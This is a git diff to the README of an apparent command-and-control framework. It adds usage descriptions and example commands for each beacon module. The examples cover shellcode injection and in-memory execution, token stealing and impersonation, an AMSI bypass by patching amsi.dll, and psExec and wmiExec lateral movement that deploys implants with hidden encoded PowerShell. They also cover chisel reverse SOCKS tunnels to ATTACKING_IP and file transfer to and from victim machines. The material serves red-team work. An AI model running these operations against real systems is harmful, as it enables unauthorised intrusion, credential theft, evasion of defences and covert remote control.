@@ -76,30 +76,30 @@ Windows beacon uses primarily windows API and start with no module loaded. Modul
 
 ![alt text](https://github.com/maxDcb/C2TeamServer/blob/master/images/loadModule.png?raw=true)
 
-| Modules          |
-| :--------------- |
-| assemblyExec     |
-| upload           |
-| download         |
-| run              |
-| script           |
-| inject           |
-| pwd              |
-| cd               |
-| ls               |
-| ps               |
-| makeToken        | 
-| rev2self         | 
-| stealToken       | 
-| coffLoader       |
-| loadModule       | 
-| powershell       | 
-| kerberosUseTicket| 
-| psExec           | 
-| wmiExec          | 
-| spawnAs          | 
-| chisel           | 
-| tree             | 
+| Modules          | Description      |
+| :--------------- | :--------------- |
+| loadModule       |Load module DLL file on the memory of the beacon, giving the beacon this capability.<br>Load the DLL from the given path, if it's not found try the default ../Modules/ path.exemple:<br> - loadModule /tools/PrintWorkingDirectory.dll|
+| assemblyExec     |Execute shellcode in a process (notepad.exe), wait for the end of execution or a timeout (120 sec). Retrieve the output.<br>Use -r to use a shellcode file.<br>If -e or -d are given, use donut to create the shellcode.<br>exemple:<br>- assemblyExec -r ./shellcode.bin<br>- assemblyExec -e ./program.exe arg1 arg2...<br>- assemblyExec -e ./Seatbelt.exe -group=system<br>- assemblyExec -d ./test.dll method arg1 arg2...|
+| upload           |Upload a file from the attacker machine to the victime machine<br>exemple:<br>- upload c:\temp\toto.exe c:\temp\toto.exe|
+| download         |Download a file from victime machine to the attacker machine<br>exemple:<br>- download c:\temp\toto.exe c:\temp\toto.exe|
+| run              |Run new process on the system.<br>If the cmd is a system cmd use the following syntax 'cmd /c command'.<br>The beacon wait for the cmd to end and provide the output.'<br>exemple:<br> - run whoami<br> - run cmd /c dir<br> - run .\Seatbelt.exe -group=system|
+| script           | - |
+| inject           |Inject shellcode in the pid process. For linux must be root or at least have ptrace capability.<br>No output is provided.<br>Use -r to use a shellcode file.<br>If -e or -d are given, use donut to create the shellcode.<br>If pid is negative a new process is created for the injection.<br>exemple:<br>- inject -r ./calc.bin 2568<br>- inject -e ./beacon.exe pid arg1 arg2<br>- inject -d ./calc.dll pid method arg1 arg2|
+| pwd              |PrintWorkingDirectory|
+| cd               |ChangeDirectory|
+| ls               |ListDirectory|
+| ps               |ListProcesses|
+| makeToken        |Create a token from user and password and impersonate it. <br>exemple:<br>- makeToken DOMAIN\Username Password|
+| rev2self         |Drop the impersonation of a token, created with makeToken<br>exemple:<br>- rev2self|
+| stealToken       |Steal a token and impersonate the it. You must have administrator privilege. <br>exemple:<br>- stealToken pid|
+| coffLoader       |Load a .o coff file and execute it.<br>Coff take packed argument as entry, you get to specify the type as a string of [Z,z,s,i] for wstring, string, short, int.<br>exemple:<br>- coffLoader ./dir.x64.o go Zs c:\ 0<br>- coffLoader ./whoami.x64.o|
+| powershell       | Execute a powershell command.<br>To be sure to get the output of the commande do 'cmd | write-output'.<br>You can import module using -i, added as New-Module at every execution.<br>You run scripts using -s.<br>AMSI bypass by patching the amsi.dll will work once for all.<br>exemple:<br> - powershell whoami  |write-output<br> - powershell import-module PowerUpSQL.ps1; Get-SQLConnectionObject<br> - powershell -i /tmp/PowerUpSQL.ps1 <br> - powershell -s /tmp/script.ps1|
+| kerberosUseTicket|Import a kerberos ticket from a file to the curent LUID. <br>exemple:<br>- KerberosUseTicket /tmp/ticket.kirbi<br>|
+| psExec           |Create an exe on an SMB share of the victime and a service to launch this exec using system. <br>The exe must be a service binary or inject into another process. <br>You must have the right kerberos tickets. <br>exemple:<br>- psExec m3dc.cyber.local /tmp/implant.exe<br>- psExec 10.9.20.10 /tmp/implant.exe|
+| wmiExec          |Execute a command through Windows Management Instrumentation (WMI). <br>The user have to be administrator of the remote machine. <br>Can be use with credentials or with kerberos authentication. <br>To use with kerberos, the ticket must be in memory (use Rubeus). <br>exemple:<br>- wmiExec -u DOMAIN\Username Password target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV<br>- wmiExec -k DOMAIN\dc target powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AV|
+| spawnAs          |Launch a new process as another user, with the given credentials. <br>exemple:<br>- spawnAs DOMAIN\Username Password powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...<br>- spawnAs .\Administrator Password C:\Users\Public\Documents\implant.exe|
+| chisel           |Launch chisel in a thread on the remote server.<br>No output is provided.<br>exemple:<br>- chisel status<br>- chisel stop pid<br>Reverse Socks Proxy:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:socks<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse<br>Remote Port Forward:<br>- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT<br>- On the attacking machine: chisel server -p LISTEN_PORT --reverse|
+| tree             |Tree|
 
 AssemblyExec & Inject, that use Donut project, make it possible to launch binary EXE, DLL, managed or unmanaged direclty from memory on the remote host.
 
